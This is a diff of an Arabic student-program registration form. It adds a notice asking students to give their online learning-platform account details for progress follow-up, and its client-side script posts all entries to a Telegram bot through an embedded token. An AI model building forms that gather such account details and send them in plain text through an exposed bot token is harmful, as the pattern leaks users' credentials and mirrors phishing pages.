@@ -291,6 +291,23 @@
             text-align: right;
         }
         
+        /* ===== تنسيق التنويه الجديد في الخطوة 4 ===== */
+        .notice-box {
+            background-color: #e0f2fe;
+            border-right: 4px solid #0284c7;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            line-height: 1.7;
+            color: #0c4a6e;
+            text-align: right;
+        }
+        .notice-box strong {
+            color: #0369a1;
+            font-size: 15px;
+        }
+        
         .system-list {
             list-style: none;
             padding-right: 5px;
@@ -445,7 +462,7 @@
             height: 100%;
             background: rgba(0,0,0,0.7);
             z-index: 10000;
-            display: flex;
+            display: none;
             justify-content: center;
             align-items: center;
             flex-direction: column;
@@ -655,10 +672,17 @@
                 </div>
             </div>
 
-            <!-- الخطوة 4: بيانات المنصات -->
+            <!-- الخطوة 4: بيانات المنصات (تم إضافة التنويه) -->
             <div class="form-step" data-step="4" id="stepPlatforms">
                 <div style="text-align: center;">
                     <div class="section-badge" style="background-color: #e0f2fe; color: #0369a1;">الجزء الرابع: بيانات المنصات التعليمية الأونلاين</div>
+                </div>
+
+                <!-- ✅ التنويه الجديد -->
+                <div class="notice-box">
+                    <strong>📌 تنويه هام:</strong><br>
+                    يتم طلب بيانات حساباتك على المنصات التعليمية الإلكترونية لغرض المتابعة الدورية والتأكد من إنجازك للمهام المتفق عليها مع فريق المتابعة.<br><br>
+                    مع العلم أن هذه البيانات تعتبر سرية تمامًا، ولا يطلع عليها أي طالب أو شخص خارج فريق المتابعة وإدارة "قضية طالب ثانوي".
                 </div>
 
                 <div id="platformsContainer">
@@ -955,7 +979,6 @@
 
         // ========== دالة إرسال البيانات إلى تليجرام ==========
         async function sendToTelegram() {
-            // جمع البيانات من النموذج
             const fullName = document.getElementById('fullName').value.trim() || "غير مدخل";
             const city = document.getElementById('city').value.trim() || "غير مدخل";
             const phone = document.getElementById('phone').value.trim() || "غير مدخل";
@@ -981,7 +1004,6 @@
             const now = new Date();
             const dateStr = `${now.getFullYear()}/${now.getMonth()+1}/${now.getDate()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
             
-            // بناء الرسالة بتنسيق احترافي
             const telegramMessage = `
 📋 **استمارة تسجيل جديدة - قضية طالب ثانوي**
 ━━━━━━━━━━━━━━━━━━━━━━━
@@ -1021,7 +1043,6 @@ ${platforms}
 🕐 **تاريخ التسجيل:** ${dateStr}
             `;
             
-            // إرسال إلى تليجرام
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             const response = await fetch(url, {
                 method: 'POST',
@@ -1063,7 +1084,6 @@ ${platforms}
             const fullName = document.getElementById('fullName').value.trim();
             const firstName = fullName ? fullName.split(' ')[0] : "بطل";
             
-            // التحقق من اختيار خطة الاشتراك
             const selectedPlan = document.getElementById('selectedCourseValue').value;
             if (!selectedPlan) {
                 alert("❌ الرجاء اختيار خطة الاشتراك أولاً");
@@ -1073,9 +1093,7 @@ ${platforms}
             showLoading();
             
             try {
-                // إرسال البيانات إلى تليجرام
                 const sent = await sendToTelegram();
-                
                 if (sent) {
                     console.log("✅ تم إرسال البيانات إلى تليجرام بنجاح");
                 } else {
@@ -1085,7 +1103,6 @@ ${platforms}
                 console.error("❌ خطأ في الإرسال:", error);
             }
             
-            // إظهار رسالة النجاح للمستخدم
             document.getElementById('studentName').innerText = firstName;
             steps[currentStepIndex].classList.remove('active');
             document.getElementById('successStep').classList.add('active');
